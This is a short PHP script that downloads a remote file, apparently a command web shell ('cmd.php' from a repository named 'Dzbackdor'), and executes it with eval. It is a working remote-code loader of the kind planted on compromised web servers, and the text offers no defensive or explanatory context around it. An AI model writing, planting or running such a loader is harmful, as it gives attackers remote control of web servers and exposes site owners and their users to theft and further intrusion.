<?php
    $Url = "https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/cmd/cmd.php";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo eval('?>'.$output);
?>
